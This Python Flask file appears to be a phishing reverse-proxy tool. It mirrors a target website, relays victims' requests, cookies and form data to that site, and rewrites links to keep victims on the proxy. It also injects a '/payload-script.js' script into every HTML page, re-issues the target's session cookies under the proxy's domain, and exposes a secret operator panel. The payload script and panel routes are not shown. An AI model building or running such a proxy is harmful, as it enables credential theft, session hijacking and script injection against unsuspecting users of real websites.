from flask import Flask, request, Response, send_from_directory, jsonify, redirect
import requests
import json
import os
from datetime import datetime
from urllib.parse import urljoin, urlparse
import re
from bs4 import BeautifulSoup
from colorama import Fore

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')
    
    # Create a session with optimized settings
    session = requests.Session()
    session.verify = False
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=100,
        pool_maxsize=100,
        max_retries=3,
        pool_block=False
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    def modify_html(content):
        try:
            soup = BeautifulSoup(content, 'html.parser')
            
            # Inject our payload
            payload = soup.new_tag('script', src='/payload-script.js')
            if soup.head:
                soup.head.append(payload)
            elif soup.body:
                soup.body.insert(0, payload)
            
            # Fix all URLs
            for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
                for attr in ['href', 'src', 'action']:
                    if tag.get(attr):
                        url = tag[attr]
                        if url.startswith('//'):
                            tag[attr] = f'https:{url}'
                        elif url.startswith('/'):
                            tag[attr] = f'/{url.lstrip("/")}'
                        elif not url.startswith(('http://', 'https://', 'data:', '#', 'javascript:', 'mailto:')):
                            tag[attr] = f'/{url}'

            return str(soup)
        except Exception as e:
            print(f"{Fore.RED}[!] HTML modification error: {e}{Fore.RESET}")
            return content

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        try:
            # Handle panel requests
            if path.startswith(secret):
                if path == secret:
                    return panel_index()
                filename = path[len(secret)+1:]
                return panel_files(filename)

            # Handle OPTIONS requests
            if request.method == 'OPTIONS':
                return Response('', 200, {
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': '*',
                    'Access-Control-Allow-Headers': '*'
                })

            # Build target URL
            target_url = f"https://{target}/{path}"
            if request.query_string:
                target_url += f"?{request.query_string.decode()}"

            print(f"{Fore.CYAN}[*] Proxying: {request.method} {target_url}{Fore.RESET}")

            # Prepare headers
            headers = {
                key: value for key, value in request.headers.items()
                if key.lower() not in ['host', 'content-length', 'content-encoding']
            }
            headers['Host'] = target
            
            # Forward the request with a shorter timeout
            resp = session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=False,
                timeout=(3.05, 10)  # (connect timeout, read timeout)
            )

            # Handle redirects
            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get('Location', '')
                if location.startswith('http'):
                    parsed = urlparse(location)
                    if parsed.netloc == target:
                        location = parsed.path
                        if parsed.query:
                            location += f"?{parsed.query}"
                elif not location.startswith('/'):
                    location = f"/{location}"
                return redirect(location, code=resp.status_code)

            # Process response
            content = resp.content
            content_type = resp.headers.get('Content-Type', '').lower()

            # Modify HTML content
            if 'text/html' in content_type:
                try:
                    decoded = content.decode('utf-8')
                    modified = modify_html(decoded)
                    content = modified.encode('utf-8')
                except UnicodeDecodeError:
                    pass

            # Prepare response headers
            response_headers = [
                (key, value) for key, value in resp.headers.items()
                if key.lower() not in ['content-length', 'transfer-encoding', 'content-encoding', 'connection']
            ]

            # Create response
            response = Response(content, resp.status_code, response_headers)

            # Handle cookies
            for cookie in resp.cookies:
                response.set_cookie(
                    key=cookie.name,
                    value=cookie.value,
                    domain=request.host,
                    path=cookie.path or '/',
                    secure=cookie.secure,
                    httponly=cookie.has_nonstandard_attr('HttpOnly'),
                    samesite='Lax'
                )

            return response

        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[!] Request timed out for: {target_url}{Fore.RESET}")
            return "The request timed out. Please try again.", 504

        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[!] Connection error for: {target_url}{Fore.RESET}")
            return "Failed to connect to the server.", 502

        except Exception as e:
            print(f"{Fore.RED}[!] Proxy error: {str(e)}{Fore.RESET}")
            return "An error occurred. Please try again.", 500

    # Keep existing routes...

    print(f"\n{Fore.GREEN}[+] Panel URL: http://{host}:{port}/{secret}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Proxy running on http://{host}:{port}/{Fore.RESET}")
    
    # Run with optimized settings
    app.run(
        host='0.0.0.0',
        port=port,
        threaded=True,
        debug=False
    )